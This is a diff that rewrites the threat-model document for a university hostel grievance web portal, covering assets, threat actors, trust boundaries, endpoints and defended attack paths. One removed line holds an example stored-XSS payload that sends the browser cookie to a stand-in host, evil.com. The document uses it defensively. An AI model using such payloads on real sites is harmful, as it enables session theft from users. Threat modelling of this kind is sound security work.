@@ -1,147 +1,105 @@
-# Threat Model — HostelGrievance
+# Threat Model & Attack Surface — HostelGrievance
 
-## 1. System Overview & Scope
-
-**HostelGrievance** is a university web portal providing grievance management for hostel residents (Students) and hostel administrators (Wardens). 
-- **Frontend**: Svelte 5 / SvelteKit 2 SPA client running in the user's browser.
-- **Backend API**: Hono v4 on Node.js handling authentication, authorization, SQLite data operations, and file storage.
-- **Data Store**: Local SQLite database file (`data/hostel.db`).
-- **File Store**: Local filesystem attachment directory (`uploads/`).
+This document outlines the threat model for the HostelGrievance application, identifying key assets, threat actors, trust boundaries, attack surface, and primary attack paths with their defenses.
 
 ---
 
-## 2. Assets & Data Classification
+## 1. Assets to Protect
 
-| Asset | Classification | Security Objectives |
-| :--- | :--- | :--- |
-| **Student Account Information** | Confidential | Protect user profile, room assignments, and email addresses from enumeration or harvesting. |
-| **Warden Account Information** | Confidential | Protect warden identities, credentials, and administrative credentials. |
-| **Authentication & Session Tokens** | Critical Secret | Prevent token forgery, hijacking, prediction, and post-logout replay. |
-| **Password Hashes** | Critical Secret | Protect against offline dictionary/rainbow-table attacks using salted key derivation (`scrypt`). |
-| **Grievance Records & Descriptions** | Confidential / Integrity | Ensure grievance contents are visible only to the filing student and authorized wardens. Prevent unauthorized modification. |
-| **Grievance Comments & Dialogue** | Confidential / Integrity | Ensure communications remain strictly between the student owner and wardens. Prevent Stored XSS injection. |
-| **Attachment Files & Metadata** | Confidential / Integrity | Protect uploaded images from unauthorized download, path traversal, and malicious script execution. |
-| **SQLite Database File (`hostel.db`, `-wal`, `-shm`)** | Critical / Confidential | Prevent direct web access, unauthorized reads/writes, or path leakage. |
-| **Filesystem & Source Code** | Integrity | Prevent arbitrary file writes, script uploads, or overwrite attacks. |
-| **Audit Logs** | Integrity / Confidentiality | Maintain tamper-evident logs for security events without recording passwords or secrets. |
+The primary assets requiring protection in HostelGrievance include:
+
+1. **Student Personal Information**: Student names, room numbers, emails, and grievance histories.
+2. **Grievance Details**: Private complaint descriptions, maintenance issues, room access notes, and uploaded photos.
+3. **Authentication Credentials**: User passwords, session tokens, and 3-factor recovery secrets.
+4. **Warden Management Capabilities**: Administrative authority to update grievance status and view hostel-wide logs.
+5. **Security & Audit Logs**: Historical records of logins, failed attempts, and unauthorized actions.
+6. **Application Storage & Database**: The local SQLite database (`data/hostel.db`), uploads directory, and cryptographic keys.
 
 ---
 
-## 3. Threat Actors & Capabilities
+## 2. Threat Actors
 
-### 3.1 Unauthenticated Attacker
-- **Capabilities**: Remote network access, public endpoint discovery, automated fuzzing, brute-force password attacks, cookie tampering.
-- **Goals**: Bypass authentication, discover private endpoints, upload unauthenticated files, exploit server vulnerabilities to gain initial access.
-
-### 3.2 Normal Student
-- **Capabilities**: Valid student credentials, browser interaction with legitimate workflows (file grievances, view own dashboard, comment, upload photos).
-- **Security Boundary**: Must only access and mutate resources belonging to their own user ID (`stu-*`).
-
-### 3.3 Malicious Student (Insider Threat)
-- **Capabilities**: Valid authenticated session, browser developer tools, custom API scripts (curl, Postman), ability to craft arbitrary JSON/multipart payloads, manipulate IDs, tamper with parameters.
-- **Goals**: Read other students' private grievances (IDOR), edit or delete other students' records, alter ticket status, download other students' attachments, inject Stored XSS into grievance comments, upload malicious executables.
-
-### 3.4 Normal Warden
-- **Capabilities**: Valid warden credentials, administrative dashboard access across all hostel students, ability to update statuses and post official comments.
-- **Security Boundary**: May view all grievances and change statuses, but cannot edit student grievance descriptions/titles or access server filesystem/DB directly.
-
-### 3.5 Compromised Session Attacker
-- **Capabilities**: Possession of a stolen or intercepted session cookie.
-- **Goals**: Elevate privileges from student to warden, access historic data, maintain persistent access.
-
-### 3.6 Compromised Application Process
-- **Capabilities**: Arbitrary code execution within the Node.js process.
-- **Goals**: Lateral movement across host system, reading sensitive filesystem data, establishing reverse shells.
+* **Unauthenticated Internet Attacker**: Anyone on the network probing public endpoints, attempting brute-force password guessing, credential stuffing, or uploading malicious files.
+* **Malicious Authenticated Student**: A registered student who attempts to view or tamper with other students' grievances, alter status flags, inject malicious scripts (XSS), or access warden-only dashboards.
+* **Compromised Account Attacker**: An adversary who has gained access to a valid student or warden session token.
+* **Rogue Insider / Snooper**: A user trying to discover physical locations of students through image metadata (EXIF) or room maintenance reports.
 
 ---
 
-## 4. Trust Boundaries & Data Flows
+## 3. Trust Boundaries
 
 ```
-┌─────────────────────────────────────────────────────────────┐
-│ 1. Browser Client (Untrusted Environment)                  │
-│    - Attacker controls JavaScript runtime, DOM, HTTP headers│
-└──────────────────────────────┬──────────────────────────────┘
-                               │ [Trust Boundary 1: Network & Origin]
-                               │ TLS / CORS Allowlist / Security Headers
-                               ▼
-┌─────────────────────────────────────────────────────────────┐
-│ 2. Backend API Router & Authentication (Hono)               │
-│    - Session cookie verification (HttpOnly, Expiration)     │
-│    - Rate limiting & input size validation                  │
-└──────────────────────────────┬──────────────────────────────┘
-                               │ [Trust Boundary 2: Identity & Session]
-                               │ Validated SessionUser (userId, role)
-                               ▼
-┌─────────────────────────────────────────────────────────────┐
-│ 3. Authorization & Object-Level Policy (BOLA Defense)       │
-│    - assertCanViewGrievance(user, grievanceRow)             │
-│    - Student ownership enforcement (row.student_id === uid) │
-│    - Role boundary enforcement (Warden vs Student)          │
-└──────────────────────────────┬──────────────────────────────┘
-                               │ [Trust Boundary 3: Data Access]
-                               │ Parameterized SQL / Validated File Path
-                               ▼
-┌─────────────────────────────────────────────────────────────┐
-│ 4. Storage & Persistence Boundary                           │
-│    - Local SQLite (`data/hostel.db`) (Restricted perms)     │
-│    - Isolated Uploads Storage (`uploads/`) (Random Hex Names)│
-└─────────────────────────────────────────────────────────────┘
+[ Untrusted Web Browser / Client ]
+              │
+              ▼  (HTTP / JSON Requests over TLS)
+┌────────────────────────────────────────────────────────┐
+│  TRUST BOUNDARY 1: Edge & Network Security             │
+│  - IP Rate Limiting (30 req / min)                     │
+│  - Account Lockout Counter (3 fails / 5 fails)         │
+│  - Geo-IP & Impossible Travel Checks                   │
+└─────────────────────────────┬──────────────────────────┘
+                              │
+                              ▼
+┌────────────────────────────────────────────────────────┐
+│  TRUST BOUNDARY 2: Authentication & Session Layer      │
+│  - Session Token Validation (`readSessionUser`)        │
+│  - Token Expiration & Cookie Security (`HttpOnly`)     │
+│  - Salted Scrypt Password & 3-Factor Reset Engine      │
+└─────────────────────────────┬──────────────────────────┘
+                              │
+                              ▼
+┌────────────────────────────────────────────────────────┐
+│  TRUST BOUNDARY 3: Authorization & Object Security     │
+│  - IDOR Ownership Checks (`student_id === user.id`)    │
+│  - Parameter Whitelisting (Mass Assignment Defense)    │
+│  - HTML Input Sanitization (Stored XSS Defense)        │
+│  - Magic Byte Image Validation & EXIF Metadata Strip   │
+└─────────────────────────────┬──────────────────────────┘
+                              │
+                              ▼
+┌────────────────────────────────────────────────────────┐
+│  TRUST BOUNDARY 4: Storage & Data Encryption Layer     │
+│  - AES-256-GCM Column-Level Encryption at Rest         │
+│  - Parameterized SQLite Queries (SQLi Prevention)      │
+│  - Isolated `uploads/` Storage with Random File Names  │
+└────────────────────────────────────────────────────────┘
 ```
 
-### Trust Boundary Analysis:
-1. **Browser ➔ API Router**: No client-supplied headers or JSON parameters are trusted. Input validation, sanitization, and rate limits are enforced immediately.
-2. **API Router ➔ Authorization Layer**: Authentication establishes *who* the caller is, but *never* grants blanket object access. Every resource request is checked against the target record's owner ID.
-3. **Authorization Layer ➔ SQLite / Filesystem**: All queries use parameterized SQL prepared statements. All file operations resolve within canonicalized boundaries and use unguessable random names.
+---
+
+## 4. Attack Surface
+
+The application exposes the following key entry points to clients:
+
+| Entry Point | Method | Intended Purpose | Primary Threat | Mitigation Applied |
+|:---|:---|:---|:---|:---|
+| `/api/login` | `POST` | User authentication | Brute force, credential stuffing, impossible travel | Progressive account lockout (10s/15s), IP rate limits, Geo-IP anomaly alerts. |
+| `/api/logout` | `POST` | Session termination | Stale session reuse | Immediate session record deletion from database and cookie clearance. |
+| `/api/auth/reset-password` | `POST` | Emergency password reset | Unauthorized account takeover | Requires 3 independent salted secrets (PIN + Word + Symbols) and checks HaveIBeenPwned. |
+| `/api/grievances` | `GET` | List grievances | Data exposure | Students only receive their own rows; Wardens receive all. |
+| `/api/grievances` | `POST` | Create a new grievance | Stored XSS, malicious file upload | Server-side text sanitization, 2MB file limit, magic byte validation, EXIF stripping. |
+| `/api/grievances/:id` | `GET` | View grievance details | IDOR (reading others' tickets) | Server verifies ownership before returning data. AES-256 decrypted in memory. |
+| `/api/grievances/:id` | `PATCH` | Edit grievance / update status | Privilege escalation | Students can only edit own open tickets; Wardens can only change status. |
+| `/api/grievances/:id/comments` | `POST` | Add comment | BOLA / Unauthorized posting | Server verifies user owns grievance or is a warden. HTML content sanitized. |
+| `/api/attachments/:id` | `GET` | Download photo | Direct object reference leak | Checks parent grievance authorization before serving file with `nosniff` headers. |
+| `/api/security-logs` | `GET` | View security alerts | Information disclosure | Scoped by role: students see only their account alerts; wardens see system threats. |
 
 ---
 
-## 5. Important Attack Paths & Blast-Radius Mitigation
+## 5. Key Attack Paths & Defenses
 
-### Path 1: IDOR / BOLA on Grievance Records (`GET /api/grievances/:id`)
-- **Entry Point**: URL parameter `:id` (e.g. `GET /api/grievances/GRV-0003`).
-- **Attacker Capability**: Authenticated student modifying the grievance ID to another student's ticket.
-- **Defense Mechanism**: Server fetches record, executes `assertCanViewGrievance(user, row)`, and checks `if (user.role === 'student' && row.student_id !== user.id) throw 403`.
-- **Blast Radius If Control Fails**: Constrained to grievance metadata. Secondary defenses (separate attachment check, comment authorization check) prevent cascading data leakage.
+### Attack Path 1: Brute-Force Password Takeover
+* **Attack Scenario**: Attacker runs a wordlist attack against `student@example.test`.
+* **Defense**: After 3 failed attempts, the account is locked for 10 seconds. After 5 failed attempts, it is locked for 15 seconds. Active sessions are terminated, and the event is written to the security log. Even if the correct password is entered during lockout, the login is blocked.
 
-### Path 2: Stored Cross-Site Scripting (XSS) via Comments
-- **Entry Point**: `POST /api/grievances/:id/comments` with payload `<script>document.location='http://evil.com/?c='+document.cookie</script>`.
-- **Attacker Capability**: Authenticated user posting comments that are rendered in other users' browsers via `{@html comment.body}`.
-- **Defense Mechanism**:
-  1. Server-side HTML entity sanitization (`sanitizeText`) encodes `<` and `>` into `&lt;` and `&gt;`.
-  2. Session cookies are protected with `HttpOnly`, making cookies inaccessible to JavaScript even if an XSS bypass occurred.
-- **Blast Radius If Control Fails**: Cookies cannot be exfiltrated due to `HttpOnly`.
+### Attack Path 2: IDOR / Snooping on Other Students' Tickets
+* **Attack Scenario**: Student A inspects HTTP traffic, notices ticket `GRV-0003` belongs to Student B, and requests `GET /api/grievances/GRV-0003`.
+* **Defense**: The server executes `assertCanViewGrievance(user, row)`. Since `row.student_id !== user.id`, the server immediately responds with `403 Forbidden` and logs an unauthorized access attempt.
 
-### Path 3: Malicious File Upload & Remote Code Execution (RCE)
-- **Entry Point**: `POST /api/grievances/:id/attachments` with a webshell or executable renamed to `shell.php` or `shell.png`.
-- **Attacker Capability**: Multipart upload containing malicious code.
-- **Defense Mechanism**:
-  1. **File Signature / Magic Bytes**: Server inspects initial bytes (`validateImageSignature`) and rejects non-image binaries.
-  2. **Storage Isolation**: Server completely discards user-supplied filename and writes bytes as `<random16Hex>.png` in `uploads/`.
-  3. **Execution Prevention**: The uploads directory is not served as executable scripts.
-  4. **Serving Headers**: Served with `X-Content-Type-Options: nosniff` and `Content-Security-Policy: default-src 'none'; sandbox`.
-- **Blast Radius If Control Fails**: File is stored with random name and cannot be directly addressed or executed on the server.
+### Attack Path 3: Malicious File Upload & EXIF Privacy Leak
+* **Attack Scenario**: Attacker uploads a PHP/JS script renamed to `photo.png`, or uploads an image containing home GPS coordinates.
+* **Defense**: The server validates file magic bytes to verify it is a genuine image, strips all EXIF metadata chunks, assigns a random filename, and stores it outside the web root.
 
-### Path 4: Privilege Escalation & Status Manipulation
-- **Entry Point**: `PATCH /api/grievances/:id` with `{"status": "Resolved"}` from a Student account.
-- **Attacker Capability**: Authenticated student sending warden-only status fields.
-- **Defense Mechanism**: Backend switch on `user.role` strictly rejects `status` modifications from students (`403 Forbidden`) and forbids content edits from wardens.
-- **Blast Radius If Control Fails**: Status changes are recorded in audit logs with timestamp and user ID for immediate detection and rollback.
-
-### Path 5: Database Direct Exposure / SQL Injection
-- **Entry Point**: SQL queries constructed from request inputs.
-- **Attacker Capability**: SQL injection payloads in title, search, ID, or comment bodies.
-- **Defense Mechanism**: 100% of SQLite database queries use parameterized prepared statements (`better-sqlite3` `prepare(...).run/get/all(params)`).
-- **Blast Radius If Control Fails**: Database permissions are restricted to the local user process; database is outside web root.
-
----
-
-## 6. Blast Radius Matrix
-
-| Failure Scenario | Single Point of Failure? | Secondary Containment Control | Resulting Blast Radius |
-| :--- | :--- | :--- | :--- |
-| **Authentication Bypassed** | No | Object-level authorization and user session validation still required on all protected data endpoints. | Attacker cannot access grievances without valid session binding. |
-| **Student Ownership Check Missed** | No | Direct database access is blocked; audit logs track unauthorized access; attachments and comments require independent checks. | Exposure limited to single grievance record; no system-wide compromise. |
-| **Malicious File Uploaded** | No | Magic bytes verified, disk filename randomized, served with `nosniff` + `sandbox`, uploads stored outside web root. | File stored as inert bytes; zero execution capability. |
-| **Session Cookie Stolen** | No | `SameSite=Lax` prevents CSRF; `HttpOnly` blocks JS access; TTL auto-expires token; user logout destroys DB record. | Access strictly bounded to victim student's account until session expiration. |
-| **Server Error Occurs** | No | `handleError` masks all internal 500 errors into generic response; stack traces and SQL queries logged only to server console. | Zero information disclosure to client. |
+### Attack Path 4: Database Leak / Physical File Dump
+* **Attack Scenario**: An attacker gets a copy of `data/hostel.db` from disk.
+* **Defense**: All password hashes use salted `scrypt`, and all grievance titles, descriptions, and comments are encrypted with AES-256-GCM. The raw database contains no plaintext complaint details.
